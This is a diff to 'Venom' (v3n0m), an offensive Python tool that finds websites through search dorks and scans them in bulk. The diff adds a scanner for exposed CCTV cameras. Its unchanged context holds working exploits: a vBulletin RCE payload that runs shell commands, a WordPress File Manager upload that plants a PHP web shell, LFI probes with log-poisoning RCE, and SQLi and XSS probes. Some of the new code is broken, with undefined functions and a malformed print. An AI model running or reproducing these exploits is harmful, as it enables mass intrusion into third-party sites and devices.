@@ -55,7 +55,7 @@ def logo():
         """
 
                                                    :=*#%%@%%#+-:         :-=+****+=:.
-         Venom <  4.3.4  >                      .+%@@@@@@%*==--=+#%#+- :**+--:...::=+#%*-
+         Venom <  4.3.5  >                      .+%@@@@@@%*==--=+#%#+- :**+--:...::=+#%*-
       Enhanced Dorking & Vuln Scans           :#@@@@@@@+.          :=*%#=.             -#%-
           Now with eleet banner "             +@@@@@@@@:     :**=+***+====*#=.            :%#.
                           ...........:---. #@@@@@@@@-     -@.-=::::-=--+=+#@*:            #%
@@ -91,6 +91,64 @@ def logo():
     )
 
 
+class cctvthread(threading.Thread):
+    def __init__(self, hosts):
+        self.hosts = hosts
+        self.fcount = 0
+        self.check = True
+        threading.Thread.__init__(self)
+
+    def run(self):
+        urls = list(self.hosts)
+        for url in urls:
+            try:
+                if self.check:
+                    cctv(url)
+                else:
+                    break
+            except KeyboardInterrupt:
+                pass
+        self.fcount += 1
+
+    def stop(self):
+        self.check = False
+def cctv_testing():
+    print(B + "\n[+] Preparing for CCTV scanning ...")
+    print("[+] Can take a while ...")
+    print("[!] Working ...\n")
+    vb = len(usearch) / int(numthreads)
+    i = int(vb)
+    m = len(usearch) % int(numthreads)
+    z = 0
+    if len(threads) <= int(numthreads):
+        for x in range(0, int(numthreads)):
+            sliced = usearch[x * i : (x + 1) * i]
+            if z < m:
+                sliced.append(usearch[int(numthreads) * i + z])
+                z += 1
+            thread = cctvthread(sliced)
+            thread.start()
+            threads.append(thread)
+        for thread in threads:
+            thread.join()
+
+def cctv(url):
+    try:
+        reqs = requests.get(url,timeout=2)
+        soup = bs4.BeautifulSoup(reqs.text, 'html.parser')
+        title = str(soup.find('title'))
+        remove_dupes = []
+        for cam in cctvs:
+            if title is not None and cam in title and url not in remove_dupes:
+                remove_dupes.append(url)
+                print(url + " %s  CCTV Discovered!!!" % cam)
+                vuln.append(url)
+                cctv_log_file.write("\n" + url + " " +  cam)
+    except:
+        pass
+
+
+
 def vbulletin5_scanning(url):
     url = url.rsplit(sites, 1)[0]
     url = url + sites
@@ -98,7 +156,7 @@ def vbulletin5_scanning(url):
     cmd = "id"
     params["widgetConfig[code]"] = "echo shell_exec('" + cmd + "'); exit;"
     try:
-        r = requests.post(url=url, data=params, timeout=5)
+        r = requests.post(url=url, data=params, timeout=2)
         if "uid=" and "gid" and "groups=" in r.text:
             print(R + url + " ====> Vbulletin 5.x vuln found")
             vuln.append(url)
@@ -167,7 +225,7 @@ def wp_filemanager_scanning(url):
         }
         data = '-----------------------------42474892822150178483835528074\r\nContent-Disposition: form-data; name="reqid"\r\n\r\n1744f7298611ba\r\n-----------------------------42474892822150178483835528074\r\nContent-Disposition: form-data; name="cmd"\r\n\r\nupload\r\n-----------------------------42474892822150178483835528074\r\nContent-Disposition: form-data; name="target"\r\n\r\nl1_Lw\r\n-----------------------------42474892822150178483835528074\r\nContent-Disposition: form-data; name="upload[]"; filename="payl04dz.php"\r\nContent-Type: application/php\r\n\r\n<?php system($_GET[\'cmd\']); echo \'v3n0m\'; ?>\n\r\n-----------------------------42474892822150178483835528074\r\nContent-Disposition: form-data; name="mtime[]"\r\n\r\n1597850374\r\n-----------------------------42474892822150178483835528074--\r\n'
         req = requests.post(
-            url + path, headers=headers, data=data, timeout=10, verify=False
+            url + path, headers=headers, data=data, timeout=2, verify=False
         )
         if req:
             p4th = url + "/wp-content/plugins/wp-file-manager/lib/files/payl04dz.php"
@@ -179,7 +237,7 @@ def wp_filemanager_scanning(url):
                 "Content-Type": "multipart/form-data; boundary=---------------------------42474892822150178483835528074",
                 "Connection": "close",
             }
-            payload = requests.get(p4th, headers=head3r, timeout=10, verify=False)
+            payload = requests.get(p4th, headers=head3r,timeout=2, verify=False)
             if "v3n0m" in payload.text:
                 print(url + "Vuln Found ====> Wordpress File Manager > 6.9 RCE")
                 vuln.append(url)
@@ -242,7 +300,7 @@ def vb56(url, shell_cmd):
         r = requests.post(
             "%s/ajax/render/widget_tabbedcontainer_tab_panel" % url,
             post_data,
-            timeout=5,
+            timeout=2,
         )
     except:
         pass
@@ -260,7 +318,7 @@ def vb56_scanning(url):
         r = requests.post(
             "%s/ajax/render/widget_tabbedcontainer_tab_panel" % url,
             post_data,
-            timeout=5,
+            timeout=2,
         )
         if "uid=" and "gid=" and "groups=" in r.text:
             print(R + url + " =====> Vuln Found ===> vBulletin Ver 5.5.4 > 5.6.2 RCE ")
@@ -325,11 +383,10 @@ def lfi_scanning(url):
             try:
                 url = url.rsplit("=", 1)[0]
                 url = url + "="
-                resp = urllib.request.urlopen(url + lfi, timeout=5)
-                hits = str(resp.read())
+                r = requests.get(url + lfi, timeout=2)
             except:
                 resp = str("v3n0m")
-            if str("root:x") in hits and url not in vuln:
+            if str("root:x") in r.text and url not in vuln:
                 print(R + " [LFI] " + O + url + lfi + R + "====>" "LFI Found")
                 vuln.append(url)
                 lfi_log_file.write("\n" + url)
@@ -338,12 +395,10 @@ def lfi_scanning(url):
                 header = "<? echo md5(NovaCygni); ?>"
                 try:
                     head = {"User-Agent": header}
-                    request_web = urllib.request.Request(
-                        target, headers=head, timeout=5
+                    request_web = request.get(
+                        target, headers=head, timeout=2
                     )
-                    text = urllib.request.urlopen(request_web, timeout=5)
-                    text = text.read()
-                    if str("7ca328e93601c940f87d01df2bbd1972") in text:
+                    if str("7ca328e93601c940f87d01df2bbd1972") in request_web.text:
                         print(
                             R
                             + "[LFI >RCE]"
@@ -456,21 +511,24 @@ class xssthread(threading.Thread):
 
 
 def xss_scanning(url):
+    vuln_scan_count.append(url)
     xss_log_file = open("v3n0m-xss.txt", "a", encoding="utf-8")
     for xss in xsses:
         try:
-            source = urllib.request.urlopen(url + xss.replace("\n", ""), timeout=5)
-            hits = str(source.read())
+            source = requests.get(url + xss.replace("\n", ""), timeout=5)
         except:
-            hits = str("v3n0m")
-        if re.findall("<OY1Py", hits):
-            print(R + "\r\x1b[K[XSS]: ", O + url + xss, R + " ---> XSS Found")
-            xss_log_file.write("\n" + url)
-            vuln.append(url)
-        if re.findall("<LOY2PyTRurb1c", hits):
-            print(R + "\r\x1b[K[XSS]: ", O + url + xss, R + " ---> XSS Found")
-            xss_log_file.write("\n" + url)
-            vuln.append(url)
+            pass
+        try:
+            if re.findall("<OY1Py", source.text):
+                print(R + "\r\x1b[K[XSS]: ", O + url + xss, R + " ---> XSS Found")
+                xss_log_file.write("\n" + url)
+                vuln.append(url)
+            if re.findall("<LOY2PyTRurb1c", source.text):
+                print(R + "\r\x1b[K[XSS]: ", O + url + xss, R + " ---> XSS Found")
+                xss_log_file.write("\n" + url)
+                vuln.append(url)
+        except:
+            pass
 
 
 def xss_testing():
@@ -493,33 +551,30 @@ def xss_testing():
 
 
 def sqli_scanning(url):
+    vuln_scan_count.append(url)
+    header = [line.strip() for line in open("lists/header", "r", encoding="utf-8")]
+    ua = random.choice(header)
+    headers = {"user-agent": ua}
     aug_url = url + "'"
     global sql_list_counter
     try:
-        try:
-            resp = urllib.request.urlopen(aug_url, timeout=2)
-        except:
-
-            #   If response is not, code 200 instead of passing nothing, causing hanging.
-            #   It hangs enough.
-            #
-            resp = str("v3n0m")
-
-        #   Let's throw a value to stop null/non 200 status messages hanging the scanner.
-        #
-        hits = str(resp.read())
-        remove_dups = []
-        with open("v3n0m-sqli.txt", "a+", encoding="utf-8") as sqli_log_file:
-            for error in sqli_errors:
-                if str(error) in hits and url not in remove_dups:
+        r = requests.get(aug_url, timeout=2,headers=headers)
+    except:
+        pass
+    remove_dups = []
+    with open("v3n0m-sqli.txt", "a+", encoding="utf-8") as sqli_log_file:
+        for error in sqli_errors:
+            try:
+                if str(error) in r.text and url not in remove_dups:
                     remove_dups.append(url)
                     print(url + " is vulnerable --> %s" % str(error))
                     sqli_log_file.write("\n" + url)
-                    vuln.append(hits)
-                    col.append(hits)
+                    vuln.append(url)
+                    col.append(url)
                     sqli_log_file.flush()
-    except:
-        pass
+            except:
+                pass
+
 
 
 def life_pulse():  # Don't change this because you will break me.
@@ -762,7 +817,6 @@ def column_finder():
 
 def f_scan():
     import time
-
     global pages_pulled_as_one
     global usearch
     global numthreads
@@ -849,6 +903,7 @@ def cloudflare_resolver():
 
 
 def scan_option():
+    global cctv_log_file
     global endsub
     global lfi_log_file
     global rce_log_file
@@ -856,20 +911,22 @@ def scan_option():
     global sql_log_file
     global misc_log_file
     global vuln
+    cctv_log_file = open("v3n0m-cctv.txt", "a", encoding="utf-8")
     misc_log_file = open("v3n0m-misc.txt", "a", encoding="utf-8")
     lfi_log_file = open("v3n0m-lfi.txt", "a", encoding="utf-8")
     rce_log_file = open("v3n0m-rce.txt", "a", encoding="utf-8")
     xss_log_file = open("v3n0m-xss.txt", "a", encoding="utf-8")
     endsub = 0
+    print( R + "[0] Back to main menu")
     print(
         R
-        + "\n [1] SQLi testing: "
+        + "[1] SQLi testing: "
         + O
         + "verify the vuln links and print the injectable URL to the screen"
     )
     print(
         R
-        + " [2] SQLi testing auto mode: "
+        + "[2] SQLi testing auto mode: "
         + O
         + "attempt to verify vuln sites then column count if MySQL detected"
     )
@@ -881,22 +938,17 @@ def scan_option():
     print(R + "[8] Print all Sorted URLs")
     print(R + "[9] XSSTRIKE testing")
     print(R + "[10] Scan all the things")
-    print(R + "[11] Back to main menu")
+    print(R + "[11] CCTV Detection *Not Entirely Finished")
     print(R + "[12] MISC Vulns")
     chce = input(":")
     if chce == "1":
         os.system("clear")
         vuln = []
         sqli_testing()
-        print(
-            B
-            + "\r\x1b[ [*] Scan complete, "
-            + O
-            + str(len(col))
-            + B
-            + " vuln sites found."
-        )
-        print()
+        scan_count = len(vuln_scan_count)
+        scan_count = str(scan_count)
+        print(O + "\n" + scan_count +  + B + " Sites scanned")
+        print(B + "\r\x1b[ [*] Scan complete, " + O + str(len(col)) + B + " vuln sites found.")
     elif chce == "2":
         os.system("clear")
         vuln = []
@@ -1003,11 +1055,15 @@ def scan_option():
 
         for url in finallist:
             xss_scanning(url)
+            
+        print("\n[+] Preparing for CCTV scanning ...")
+        print(B + "\n[+] I'm working, please just hang out for a minute...\n")
+        for url in finallist:
+            cctv_scanning(url)
 
         print(B + "[*] Scan complete, " + O + str(len(col)) + B + " vuln sites found.")
     elif chce == "11":
-        endsub = 1
-        f_menu()
+        cctv_testing()
     elif chce == "12":
         print("[1] Vbulletin 5.6.x > 5.6.2")
         print("[2] WordPress File-Manager")
@@ -1049,7 +1105,7 @@ def ignoring_get(url):
     headers = {"user-agent": ua}
     try:
         try:
-            response = requests.get(url, headers=headers, timeout=5)
+            response = requests.get(url, headers=headers, timeout=2)
             response.raise_for_status()
         except Exception:
             return ""
@@ -1208,9 +1264,10 @@ async def search(pages_pulled_as_one):
 
 def f_menu():
     import time
-
+    global vuln_scan_count
     global vuln
     global customlist
+    vuln_scan_count = []
     vuln = []
     if endsub != 1:
         scan_option()
@@ -1285,59 +1342,41 @@ def f_menu():
         print(W + "")
         os.system("clear")
         logo()
-        print(R + " [1] Skip to SQLi list checking")
+        print(R + "[1] Skip to SQLi list checking")
         print(" [2] SKip to XSS list checking")
         print(" [3] Skip to LFI list checking")
         print(" [4] Skip to Vbulletin 5.x list checking ")
         print(" [5] Skip to Vbulletin < 5.6.2 list checking")
         print(" [6] Skip to WordPress FileManager list checking")
-        print(" [7] Launch LFI Suite")
+        print(" [7] Skip to CCTV list checking")
         print(" [8] FTP crawler")
         print(" [9] Skip to target list")
         print("[10] Print contents of log files")
         print("[11] rm -rf cache and logs")
-        print(
-            "[12] Perform forced update of ALL installed Python packages and dependancies on system"
-        )
+        print("[12] Perform forced update of ALL installed Python packages and dependancies on system")
+        print("[13] Launch LFI Suite")
         print(" [0] Return to main menu")
         chce2 = input(":")
         if chce2 == "1":
-
-            def sqli_url():
-                for url in sqllist:
-                    if url not in urllist:
-                        urllist.append(url)
-                        sqli_scanning(url)
-                    if url in urllist:
-                        pass
-
-            threadcount = input("How many threads ")
-            threadcount = int(threadcount)
+            global col
+            col = []
             sqllist = input("Enter list ")
             sqllist = [line.strip() for line in open(sqllist, "r", encoding="utf-8")]
-            urllist = []
-            with concurrent.futures.ThreadPoolExecutor() as executor:
-                for i in range(threadcount):
-                    executor.submit(sqli_url)
+            for url in sqllist:
+                sqli_scanning(url)
+                scan_count = len(vuln_scan_count)
+                scan_count = str(scan_count)
+            print(scan_count + " Sites scanned " )
 
         elif chce2 == "2":
-
-            def xss_url():
-                for url in xsslist:
-                    if url not in urllist:
-                        urllist.append(url)
-                        xss_scanning(url)
-                    if url in urllist:
-                        pass
-
-            threadcount = input("How many threads ")
-            threadcount = int(threadcount)
             xsslist = input("Enter list ")
             xsslist = [line.strip() for line in open(xsslist, "r", encoding="utf-8")]
-            urllist = []
-            with concurrent.futures.ThreadPoolExecutor() as executor:
-                for i in range(threadcount):
-                    executor.submit(xss_url)
+            for url in xsslist:
+                xss_scanning(url)
+            scan_count = len(vuln_scan_count)
+            scan_count = str(scan_count)
+            print(scan_count + " Sites scanned " )
+            
 
         elif chce2 == "3":
 
@@ -1423,9 +1462,13 @@ def f_menu():
                     executor.submit(wpfm_url)
 
         elif chce2 == "7":
-            lfisuite = subprocess.Popen("python " "lfisuite.py ", shell=True)
-            lfisuite.communicate()
-            subprocess._cleanup()
+            cctvlist = input("Enter list ")
+            cctvlist = [line.strip() for line in open(xsslist, "r", encoding="utf-8")]
+            for url in cctvlist:
+                cctv_scanning(url)
+            scan_count = len(vuln_scan_count)
+            scan_count = str(scan_count)
+            print(scan_count + " Sites scanned " )
 
         elif chce2 == "8":
             randomip = input("How many IP addresses do you want to scan: ")
@@ -1493,12 +1536,17 @@ def f_menu():
             )
             subprocess._cleanup()
             pass
+    elif chce == '13':
+        lfisuite = subprocess.Popen("python " "lfisuite.py ", shell=True)
+        lfisuite.communicate()
+        subprocess._cleanup()
+        
     elif chce == "0":
         print(R + "\n Exiting cleanly..")
         print(W)
         sys.exit(0)
 
-
+cctvs = [line.strip() for line in open("lists/CCTV", "r", encoding="utf-8")]
 d0rk = [line.strip() for line in open("lists/d0rks", "r", encoding="utf-8")]
 header = [line.strip() for line in open("lists/header", "r", encoding="utf-8")]
 xsses = [line.strip() for line in open("lists/xsses", "r", encoding="utf-8")]
